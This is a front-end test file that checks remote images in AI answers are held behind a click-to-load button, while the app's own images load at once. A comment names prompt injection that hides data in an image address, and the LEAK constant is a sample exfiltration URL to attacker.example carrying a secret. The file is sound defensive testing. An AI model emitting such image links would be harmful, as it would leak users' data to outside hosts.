import { render, screen } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { describe, expect, it } from 'vitest'
import { Markdown } from '@/components/ui/Markdown'
import { loadsWithoutAsking } from './remoteImages'

// refactor/BUGS.md sec-4: an image address can carry data a prompt injection put into it.
const LEAK = 'https://attacker.example/pixel.png?q=secret'

describe('images from other sites wait for a click', () => {
  it('knows which addresses load by themselves', () => {
    expect(loadsWithoutAsking('/api/attachments/1/content')).toBe(true)
    expect(loadsWithoutAsking('picture.png')).toBe(true)
    expect(loadsWithoutAsking(`${window.location.origin}/x.png`)).toBe(true)
    expect(loadsWithoutAsking('data:image/png;base64,AAAA')).toBe(true)
    expect(loadsWithoutAsking(LEAK)).toBe(false)
    expect(loadsWithoutAsking('//attacker.example/x.png')).toBe(false)
  })

  it('in an answer, shows a button instead of loading the image, and loads it when clicked', async () => {
    const { container } = render(<Markdown text={`Look: ![chart](${LEAK})`} />)
    expect(container.querySelector('img')).toBeNull()
    await userEvent.click(screen.getByRole('button', { name: /chart: show image from attacker\.example/ }))
    expect(container.querySelector('img')?.getAttribute('src')).toBe(LEAK)
  })

  it('in an answer, still shows images from the app at once', () => {
    const { container } = render(<Markdown text="![photo](/api/attachments/1/content)" />)
    const img = container.querySelector('img')
    expect(img?.getAttribute('src')).toBe('/api/attachments/1/content')
    expect(img?.getAttribute('alt')).toBe('photo')
  })
})
